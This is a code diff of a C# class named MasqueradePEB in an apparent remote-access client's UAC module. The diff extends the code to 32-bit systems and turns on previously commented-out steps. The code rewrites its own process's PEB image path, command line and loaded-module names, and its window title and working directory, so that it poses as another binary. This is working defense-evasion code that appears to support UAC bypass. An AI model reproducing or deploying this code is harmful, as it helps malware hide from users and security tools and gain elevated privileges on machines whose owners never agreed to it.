@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.IO;
 using System.Linq;
 using System.Runtime.ExceptionServices;
 using System.Runtime.InteropServices;
@@ -11,7 +12,6 @@ namespace Client.Armitage.UAC
 {
     class MasqueradePEB
     {
-
         [StructLayout(LayoutKind.Sequential)]
         public struct UNICODE_STRING : IDisposable
         {
@@ -91,7 +91,7 @@ namespace Client.Armitage.UAC
             [FieldOffset(0x002)]
             public byte BeingDebugged;
             [FieldOffset(0x003)]
-
+#if WIN64
             public byte Spare;
             [FieldOffset(0x008)]
             public IntPtr Mutant;
@@ -107,6 +107,23 @@ namespace Client.Armitage.UAC
             public IntPtr ProcessHeap;          // (PVOID) 
             [FieldOffset(0x038)]
             public IntPtr FastPebLock;          // (PRTL_CRITICAL_SECTION)
+#else
+            public byte Spare;
+            [FieldOffset(0x004)]
+            public IntPtr Mutant;
+            [FieldOffset(0x008)]
+            public IntPtr ImageBaseAddress;     // (PVOID) 
+            [FieldOffset(0x00c)]
+            public IntPtr Ldr;                  // (PPEB_LDR_DATA)
+            [FieldOffset(0x010)]
+            public IntPtr ProcessParameters;    // (PRTL_USER_PROCESS_PARAMETERS)
+            [FieldOffset(0x014)]
+            public IntPtr SubSystemData;        // (PVOID) 
+            [FieldOffset(0x018)]
+            public IntPtr ProcessHeap;          // (PVOID) 
+            [FieldOffset(0x01c)]
+            public IntPtr FastPebLock;          // (PRTL_CRITICAL_SECTION)
+#endif
         }
 
         /// Partial _PEB_LDR_DATA
@@ -295,9 +312,11 @@ namespace Client.Armitage.UAC
             return true;
         }
 
-        [HandleProcessCorruptedStateExceptions]
+
         public static bool Do(string masqBinary)
         {
+            string Arch = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
+
             // Retrieve information about the specified process
             int dwPID = Process.GetCurrentProcess().Id;
             IntPtr procHandle = OpenProcess(ProcessAccessFlags.QueryInformation | ProcessAccessFlags.VirtualMemoryRead | ProcessAccessFlags.VirtualMemoryWrite | ProcessAccessFlags.VirtualMemoryOperation, false, dwPID);
@@ -327,13 +346,13 @@ namespace Client.Armitage.UAC
             peb = PtrToStructure<_PEB>(pebPtr);
 
             // Read peb ProcessParameters into RTL_USER_PROCESS_PARAMETERS Structure
-            //RTL_USER_PROCESS_PARAMETERS upp = new RTL_USER_PROCESS_PARAMETERS();
-            //IntPtr uppPtr = StructureToPtr(upp);
-            //if (!ReadProcessMemory(procHandle, peb.ProcessParameters, uppPtr, Marshal.SizeOf(upp), out lpNumberOfBytesRead))
-            //{
-            //    return false;
-            //}
-            //upp = PtrToStructure<RTL_USER_PROCESS_PARAMETERS>(uppPtr);
+            RTL_USER_PROCESS_PARAMETERS upp = new RTL_USER_PROCESS_PARAMETERS();
+            IntPtr uppPtr = StructureToPtr(upp);
+            if (!ReadProcessMemory(procHandle, peb.ProcessParameters, uppPtr, Marshal.SizeOf(upp), out lpNumberOfBytesRead))
+            {
+                return false;
+            }
+            upp = PtrToStructure<RTL_USER_PROCESS_PARAMETERS>(uppPtr);
 
             // Read Ldr Address into PEB_LDR_DATA Structure
             _PEB_LDR_DATA pld = new _PEB_LDR_DATA();
@@ -344,26 +363,31 @@ namespace Client.Armitage.UAC
             }
             pld = PtrToStructure<_PEB_LDR_DATA>(pldPtr);
 
-            //// Change Current Working Directory and Window title
-            //Directory.SetCurrentDirectory(Environment.SystemDirectory);
+            // Change Current Working Directory and Window title
+            Directory.SetCurrentDirectory(Environment.SystemDirectory);
 
-            //// Set the Title of the Window                                                                   
-            //SetWindowText(Process.GetCurrentProcess().MainWindowHandle, masqBinary);
+            // Set the Title of the Window                                                                   
+            SetWindowText(Process.GetCurrentProcess().MainWindowHandle, masqBinary);
 
             // Let's overwrite UNICODE_STRING structs in memory
 
             // Take ownership of PEB
-            try
-            {
-                RtlEnterCriticalSection(peb.FastPebLock);
-            }
-            catch { return false; }
+            RtlEnterCriticalSection(peb.FastPebLock);
+
             // Masquerade ImagePathName and CommandLine
             IntPtr ImagePathNamePtr = IntPtr.Zero;
             IntPtr CommandLinePtr = IntPtr.Zero;
 
-            ImagePathNamePtr = new IntPtr(peb.ProcessParameters.ToInt64() + 0x60);
-            CommandLinePtr = new IntPtr(peb.ProcessParameters.ToInt64() + 0x70);
+            if (Arch == "AMD64")
+            {
+                ImagePathNamePtr = new IntPtr(peb.ProcessParameters.ToInt64() + 0x60);
+                CommandLinePtr = new IntPtr(peb.ProcessParameters.ToInt64() + 0x70);
+            }
+            else
+            {
+                ImagePathNamePtr = new IntPtr(peb.ProcessParameters.ToInt32() + 0x38);
+                CommandLinePtr = new IntPtr(peb.ProcessParameters.ToInt32() + 0x40);
+            }
 
             if (!RtlInitUnicodeString(procHandle, ImagePathNamePtr, "ImagePathName", masqBinary))
             {
@@ -390,8 +414,16 @@ namespace Client.Armitage.UAC
                 IntPtr FullDllNamePtr = IntPtr.Zero;
                 IntPtr BaseDllNamePtr = IntPtr.Zero;
 
-                FullDllNamePtr = new IntPtr(pNextModuleInfo.ToInt64() + 0x48);
-                BaseDllNamePtr = new IntPtr(pNextModuleInfo.ToInt64() + 0x58);
+                if (Arch == "AMD64")
+                {
+                    FullDllNamePtr = new IntPtr(pNextModuleInfo.ToInt64() + 0x48);
+                    BaseDllNamePtr = new IntPtr(pNextModuleInfo.ToInt64() + 0x58);
+                }
+                else
+                {
+                    FullDllNamePtr = new IntPtr(pNextModuleInfo.ToInt32() + 0x24);
+                    BaseDllNamePtr = new IntPtr(pNextModuleInfo.ToInt32() + 0x2C);
+                }
 
                 // Read FullDllName into string
                 wFullDllName = ldte.FullDllName.ToString();
